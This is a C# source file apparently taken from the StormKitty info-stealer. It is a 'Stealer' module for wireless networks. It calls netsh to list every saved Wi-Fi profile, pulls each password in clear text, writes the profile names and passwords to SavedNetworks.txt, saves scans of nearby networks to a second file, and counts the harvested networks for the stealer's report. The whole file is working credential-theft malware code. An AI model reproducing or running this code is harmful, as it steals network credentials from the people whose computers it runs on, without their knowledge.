using System;
using System.IO;
using System.Linq;
using StormKitty;

namespace Stealer
{
    internal sealed class Wifi
    {
        // Get WiFi profile names
        private static string[] GetProfiles()
        {
            string output = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All");
            string[] wNames = output.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < wNames.Length; i++)
                wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
            return wNames;
        }

        // Get Wifi password by profile name
        private static string GetPassword(string profile)
        {
            string output = CommandHelper.Run($"/C chcp 65001 && netsh wlan show profile name=\"{profile}\" key=clear | findstr Key");
            return output.Split(':').Last().Trim();
        }

        // Save all wifi networks to file
        public static void ScanningNetworks(string sSavePath)
        {
            string output = CommandHelper.Run($"/C chcp 65001 && netsh wlan show networks mode=bssid");
            File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", output);
        }

        // Save wifi networks with passwords to file
        public static void SavedNetworks(string sSavePath)
        {
            string[] profiles = GetProfiles();
            foreach (string profile in profiles)
            {
                // Skip
                if (profile.Equals("65001"))
                    continue;

                Counter.SavedWifiNetworks++;
                string pwd = GetPassword(profile);
                string fmt = $"PROFILE: {profile}\nPASSWORD: {pwd}\n\n";
                File.AppendAllText(sSavePath + "\\SavedNetworks.txt", fmt);
            }
        }

    }
}
